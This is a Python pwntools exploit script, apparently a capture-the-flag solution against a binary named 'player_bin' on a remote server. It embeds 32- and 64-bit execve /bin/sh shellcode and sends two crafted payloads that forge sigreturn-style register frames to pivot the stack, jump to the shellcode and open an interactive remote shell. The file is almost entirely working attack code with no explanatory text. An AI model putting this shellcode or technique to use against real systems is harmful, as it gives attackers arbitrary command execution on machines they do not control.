#!/usr/bin/env python
from pwn import *

context(os='linux', arch='amd64')
context.log_level = 'debug'

RHOST = "163.172.176.29"
RPORT = 9034
LHOST = "127.0.0.1"
LPORT = 4444
BINARY = 'player_bin'
# libc = ELF('None')
elf = ELF(BINARY)

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

conn = None
if len(sys.argv) > 1:
    if sys.argv[1] == 'r':
        conn = remote(RHOST, RPORT)
    elif sys.argv[1] == 'l':
        conn = remote(LHOST, LPORT)
    elif sys.argv[1] == 'a':
        conn = remote(LHOST, LPORT)
        f = open("cmd", "r")
        time.sleep(0.5)
        pid = proc.pid_by_name(BINARY)
        gdb.attach(pid[0], f)
else:
    conn = process([BINARY])

shellcode32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
shellcode64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#-----------START EXPLOIT CODE-----------#
log.info('Start exploit')
bss = section_addr('.shellcode')

stack_size = 0x400
base_stage = bss + stack_size

payload1 = 'AAAAAAAA' * 5
payload1 += p64(0) * 8              # r8-r15
payload1 += p64(0)                  # rdi
payload1 += p64(base_stage)         # rsi
payload1 += p64(0)                  # rbp
payload1 += p64(0)                  # rbx
payload1 += p64(999)                # rdx
payload1 += p64(0)                  # rax
payload1 += p64(0)                  # rcx
payload1 += p64(base_stage)         # rsp
payload1 += p64(0x10000002)         # rip
payload1 += p64(0)                  # eflags
payload1 += p64(0x33)               # csgsfs
payload1 += 'AAAAAAAA' * 4
payload1 += p64(0)                  # &fpstate

payload2 = shellcode64
payload2 += 'A' * (40 - len(shellcode64))
payload2 += p64(0) * 8              # r8-r15
payload2 += p64(0)                  # rdi
payload2 += p64(0)                  # rsi
payload2 += p64(0)                  # rbp
payload2 += p64(0)                  # rbx
payload2 += p64(0)                  # rdx
payload2 += p64(0)                  # rax
payload2 += p64(0)                  # rcx
payload2 += p64(base_stage)         # rsp
payload2 += p64(base_stage)         # rip
payload2 += p64(0)                  # eflags
payload2 += p64(0x33)               # csgsfs
payload2 += 'AAAAAAAA' * 4
payload2 += p64(0)                  # &fpstate

conn.send(payload1)
time.sleep(3)
conn.send(payload2)
conn.interactive()

